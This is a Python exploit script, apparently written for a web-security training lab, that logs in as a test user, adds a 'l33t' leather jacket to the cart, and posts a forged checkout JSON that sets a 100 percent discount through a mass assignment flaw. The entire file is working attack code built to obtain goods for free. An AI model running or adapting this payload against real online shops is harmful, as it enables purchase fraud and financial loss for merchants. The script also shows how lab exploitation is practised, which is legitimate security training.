#!/usr/bin/env python3
import argparse
import re
from typing import Tuple, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs

import requests
from bs4 import BeautifulSoup


def get_csrf_from_login(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on login page.")
    return token["value"]


def find_jacket_product_id(session: requests.Session, base_url: str) -> str:
    """
    Dynamically find the productId for the Lightweight "l33t" Leather Jacket
    by crawling the home page and looking for the product link.
    """
    resp = session.get(base_url, timeout=10)
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "html.parser")
    for a in soup.find_all("a", href=True):
        text = (a.get_text() or "").lower()
        if "lightweight" in text and "l33t" in text:
            href = a["href"]
            # Expect something like /product?productId=1
            parsed = urlparse(href)
            qs = parse_qs(parsed.query)
            pid = qs.get("productId", [None])[0]
            if pid:
                return pid

    # Fallback: regex search
    jacket_regex = re.compile(
        r'Lightweight[^<]*l33t.*?href="(/product\?productId=\d+)"',
        re.I | re.S,
    )

    m = jacket_regex.search(resp.text)
    if not m:
        raise RuntimeError("Could not automatically find jacket product link.")
    product_url = m.group(1)
    parsed = urlparse(product_url)
    qs = parse_qs(parsed.query)
    pid = qs.get("productId", [None])[0]
    if not pid:
        raise RuntimeError("Failed to parse productId from jacket link.")
    return pid


def login(session: requests.Session, base_url: str, username: str, password: str) -> None:
    login_url = urljoin(base_url, "/login")
    r = session.get(login_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_login(r.text)

    data = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }
    r = session.post(login_url, data=data, timeout=10)
    if "Log out" not in r.text:
        raise RuntimeError("Login failed, 'Log out' link not found.")


def add_jacket_to_cart(session: requests.Session, base_url: str, product_id: str) -> None:
    api_url = urljoin(base_url, f"/cart")
    data = {
        "productId": product_id,
        "redir": "PRODUCT",
        "quantity": "1",
    }
    resp = session.post(api_url, data=data, timeout=10)
    if resp.status_code not in (200, 204):
        raise RuntimeError(f"PATCH to {api_url} failed: {resp.status_code} {resp.text[:200]}")


def get_checkout_state(session: requests.Session, base_url: str) -> Dict[str, Any]:
    api_url = urljoin(base_url, "/api/checkout")
    r = session.get(api_url, timeout=10)
    r.raise_for_status()
    try:
        return r.json()
    except ValueError:
        raise RuntimeError(f"Unexpected checkout JSON response: {r.text[:200]}")


# def find_discount_field(checkout_json: Dict[str, Any]) -> Tuple[str, str]:
#     """
#     Dynamically detect the discount object and its 'percentage' field
#     by scanning the JSON structure instead of hard-coding names.
#     """
#     for k, v in checkout_json.items():
#         if isinstance(v, dict):
#             for inner_k, inner_v in v.items():
#                 if inner_k.lower() == "percentage" and isinstance(inner_v, (int, float)):
#                     return k, inner_k
#     raise RuntimeError("Could not find a discount object with a 'percentage' field in checkout JSON.")


def find_jacket_product(checkout_json: Dict[str, Any]) -> Dict[str, Any]:
    """
    Find the Lightweight "l33t" Leather Jacket within chosen_products.
    """
    products = checkout_json.get("chosen_products", [])
    for p in products:
        name = (p.get("name") or "").lower()
        if "lightweight" in name and "l33t" in name:
            return p
    raise RuntimeError("Could not find Lightweight l33t Leather Jacket in chosen_products.")


def apply_100_percent_discount(
    session: requests.Session,
    base_url: str,
    product_id: str,
) -> None:
    api_url = urljoin(base_url, "/api/checkout")

    payload = {
        "chosen_discount": {
            "percentage": 100
        },
        "chosen_products": [
            {
                "product_id": product_id,
                "quantity": 1
            }
        ]
    }

    r = session.post(api_url, json=payload, timeout=10)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"POST /api/checkout failed: {r.status_code} {r.text[:200]}")
    print("[+] Discount payload accepted. Response snippet:", r.text[:200])


def main():
    parser = argparse.ArgumentParser(
        description="Lab: Exploiting a mass assignment vulnerability"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    parser.add_argument("--user", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print("[*] Logging in as normal user...")
    login(sess, base_url, args.user, args.password)
    print("[+] Logged in.")

    print("[*] Locating jacket productId dynamically...")
    product_id = find_jacket_product_id(sess, base_url)
    print(f"[+] Found jacket productId: {product_id}")

    print("[*] Adding jacket to cart...")
    add_jacket_to_cart(sess, base_url, product_id)
    print("[*] Product added to cart")

    print("[*] Applying 100% discount via mass assignment...")
    apply_100_percent_discount(sess, base_url, product_id)
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")


if __name__ == "__main__":
    main()
